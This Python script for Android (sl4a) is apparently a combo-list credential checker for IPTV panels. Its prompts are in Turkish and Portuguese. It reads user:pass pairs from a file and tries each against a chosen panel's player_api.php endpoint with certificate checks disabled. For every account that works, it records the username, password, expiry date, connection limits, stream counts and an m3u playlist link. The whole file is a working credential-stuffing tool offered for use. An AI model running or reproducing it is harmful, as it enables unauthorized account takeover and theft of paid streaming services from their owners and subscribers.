import requests as req
import random,time, datetime
import androidhelper as sl4a
import subprocess, os
import pathlib
subprocess.run(["clear", ""])
ad = sl4a.Android()
say=0
hit=0
bul=0
cpm=1

feyzo=("""
\33[32m
 ▰▰▰▰ᴘʏᴛʜᴏɴ ᴍᴏʙɪʟ ᴍ𝟹ᴜ ᴛᴀʀᴀᴍᴀ▰▰▰▰ ''\33[0m\n
Bu çalışma @FeyzullahK tarafından kodlanmıştır. 
Hiçbir kaynak kullanılmamış ve alıntı yapılmamıştır. 
Config=m3u-combolu-v13
 ▰▰▰▰▰▰▰ 𝙈𝙧.𝙁𝙚𝙮𝙯𝙤@ ▰▰▰▰▰▰▰  '' " '
\33[0m""") 

print(feyzo) 
#=========++===+++++========++
 #Combo adını giriniz (user:pass)
 #dahili hafıza ana dizine atınız   
#combo =input("""
#MAC combonuzun adını yazınız...!
#	\33[1mDosya Adı=""") 

	
say=0
dsy=""
dir='/sdcard/combo/'
for files in os.listdir (dir):
	#if files.endswith(".txt"):
	say=say+1
	dsy=dsy+"	"+str(say)+"-) "+files+'\n'
print ("""Escolha seu combo da lista abaixo!!!
	
 """+dsy+"""
 
\33[33mCombo klasörünüzde """ +str(say)+""" Arquivo encontrado!
""")

dsyno=str(input(" \33[31mCombo No =\33[0m"))
say=0
for files in os.listdir (dir):
	#if files.endswith(".txt"):
	say=say+1
	if dsyno==str(say):
		dosyaa=(dir+files)
say=0

print(dosyaa) 


		
						
dsy=dosyaa#'/sdcard/'+combo+'.txt'
combo=dsy
dosya=""
file = pathlib.Path(dsy)
if file.exists ():
    print ("Dosya Bulundu")
else:
    print("\33[31mDosya Bulunamadı..! \33[0m") 
    dosya="yok"
#print(len(feyzo)) 
if dosya=="yok" :
    exit() 
    
subprocess.run(["clear", ""])
print(feyzo) 

#Panel ve Portu yazın (portaliptv.com:8080)
#print(feyzo) 
print("""
Seçilen dosya: """ + dsy) 
#################
panel = input("""
	\33[1mʟüᴛғᴇɴ ᴘᴀɴᴇʟ ᴀᴅıɴı ʏᴀᴢıɴıᴢ.. ? \n\n
Panel:Port=\33[0m\33[31m\33[1m""")
#=======+++=++++++====++=======
panel=panel.replace("http://","")
panel=panel.replace("/c","")
panel=panel.replace("/","")
portal=panel
fx=portal.replace(':','_')
def yaz(kullanici): 
    dosya=open('/sdcard/m3u@'+fx+'.txt','a+') 
    dosya.write(kullanici) 
    dosya.close() 

for fyz in open(combo, 'r'):  # 
 fyzz = fyz.split(":")
 userr=fyzz[0].replace(" ","")
 passs=fyzz[1].replace(" ","")
 passs=passs.replace('\n',"")
 #link="http://"+portal+"/get.php?username=" +  userr + "&password=" + passs +"&type=m3u_plus"
 
 panel=portal
 userm=userr
 pasdm=passs
 url5="http://"+panel+"/player_api.php?username="+userm+"&password="+pasdm+"&action=get_live_streams"
 
 res = req.get(url5,timeout=15, verify=False)
 veri=str(res.text)
 kanalsayisi=str(veri.count("stream_id"))
 
 url5="http://"+panel+"/player_api.php?username="+userm+"&password="+pasdm+"&action=get_vod_streams"
 res = req.get(url5, timeout=15, verify=False)
 veri=str(res.text)
 filmsayisi=str(veri.count("stream_id"))
 
 url5="http://"+panel+"/player_api.php?username="+userm+"&password="+pasdm+"&action=get_series"
 res = req.get(url5,  timeout=15, verify=False)
 veri=str(res.text)
 dizisayisi=str(veri.count("series_id"))
	   
	   
    
 link="http://"+portal+"/player_api.php?username="+userr+"&password="+passs+"&type=m3u"
 resp = req.get(link)
 say = int(say) +1
 cpm=(time.time()-cpm)
 cpm=(round(60/cpm))
 fyz=fyz.replace('\n',"")
 
 print ("\33[0m" +fyz+"-\33[32m" +portal+'\033[96m\n' +"      >>>>>Total:" + str(say)+" \33[31mHit:" + str(hit)+"\33[94m Cpm:" +str(cpm)+"\033[0m")
 cpm=time.time()
 veri=str(resp.text)
 chk=veri[:23]
 chk=chk[15:]
 
 if chk=='username':
     sound="/sdcard/kemik_sesi.mp3"
     file = pathlib.Path(sound) 
     if file.exists ():
     	ad.mediaPlay(sound)
     #print(chk)
     hit=int(hit)+1
     
     result=veri
     real=str(result).split('url":')[1]
     real=real.split(',')[0]
     real=real.replace('"',"")
     
     port=str(result).split('port":')[1]
     port=port.split(',')[0]
     port=port.replace('"',"")
     user=str(result).split('username":')[1]
     user=user.split(',')[0]
     user=user.replace('"',"")
     
     passw=str(result).split('password":')[1]
     passw=passw.split(',')[0]
     passw=passw.replace('"',"")
     
     mlink="http://"+ portal + "/get.php?username=" + user+ "&password=" + passw + "&type=m3u_plus"
     
     bitis=str(result).split('exp_date":')[1]
     bitis=bitis.split(',')[0]
     bitis=bitis.replace('"',"")
     if bitis=="null":
     	bitis="Unlimited"
     else:
     	bitis=(datetime.datetime.fromtimestamp(int(bitis)).strftime('%Y-%m-%d %H:%M:%S'))
     bitis=bitis
     acon=str(result).split('active_cons":')[1]
     acon=acon.split(',')[0]
     acon=acon.replace('"',"")
     
     mcon=str(result).split('max_connections":')[1]
     mcon=mcon.split(',')[0]
     mcon=mcon.replace('"',"")
     
     mt=("""
╭──ᴘʏᴛʜᴏɴ ᴍᴏʙɪʟ ᴍ𝟹ᴜ ᴛᴀʀᴀᴍᴀ──
├●🌐Host ➤ http://"""+portal+"""
├●📡Real ➤ http://"""+real+"""
├●📡Port ➤ """+port+"""
├●👩‍💻User ➤ """+user+"""
├●🔐Pass ➤ """+passw+""" 
├●📆Exp. ➤ """+bitis+""" 
├●👩Act Con ➤ """+acon+"""
├●👪Max Con ➤ """+mcon+""" 
├●Canais ➤"""+kanalsayisi+"""
├●Filmes ➤"""+filmsayisi+"""
├●Series ➤"""+dizisayisi+"""
├─────@Mactux
├●🌐m3u_Url="""+mlink+"""
▰▰Lista puxada por: 🇧🇷🇺🇸MÂČŤÛŠ▰▰
     """) 
     
     yaz(mt)
     print (mt," calisiyor. Dosyaya kaydedildi." )

 #quit() 
 #if(resp.status_code=a=200):
        #print (link," calisiyor. Dosyaya kaydedildi." )
        #yaz(link+'\n')
        #hit=int(hit)+1